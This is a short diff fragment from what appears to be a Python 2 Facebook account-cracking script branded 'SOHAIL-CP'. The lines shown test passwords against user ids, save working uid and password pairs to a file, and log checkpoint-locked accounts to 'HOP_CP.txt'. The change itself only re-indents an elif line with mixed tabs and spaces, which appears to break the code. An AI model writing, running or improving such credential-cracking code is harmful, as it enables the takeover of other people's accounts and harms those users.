@@ -551,7 +551,8 @@ def a_s():
                                     ok.write(uid + ' | ' + pass6 + '\n')
                                     ok.close()
                                     oks.append(uid + pass6)
-                               elif 'www.facebook.com' in q['error']:
+                               
+			        elif 'www.facebook.com' in q['error']:
                                     print '\x1b[1;31;1m[SOHAIL-CP] ' + uid + ' | ' + pass6
                                     cp = open('HOP_CP.txt', 'a')
                                     cp.write(uid + ' | ' + pass6 + '\n')
